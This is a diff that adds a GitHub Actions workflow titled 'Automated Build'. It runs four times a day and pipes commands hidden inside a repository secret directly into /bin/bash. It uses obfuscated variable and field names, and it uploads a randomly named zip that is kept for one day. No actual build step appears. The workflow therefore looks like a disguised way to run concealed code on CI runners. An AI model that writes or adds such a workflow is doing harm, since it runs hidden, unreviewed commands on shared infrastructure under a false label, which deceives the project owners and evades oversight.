@@ -1,0 +1,30 @@
+name: Automated Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '29 3,9,15,21 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  trigger:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Start
+        env:
+          taog6: ${{ secrets.taog6 }}
+        run: |
+          printf '%s' "$taog6" | jq -r .m8398 | /bin/bash
+          echo $qwew98051 | jq -r .ws850 | /bin/bash
+          printf '%s' "$u9" | jq -r .solu504 | /bin/bash
+          printf '%s' "$rpci517" | jq -r .ajlsp9064 | /bin/bash
+
+      - name: Save output
+        uses: actions/upload-artifact@v4
+        with:
+          name: PsgxqcHd
+          path: "*.zip"
+          retention-days: 1
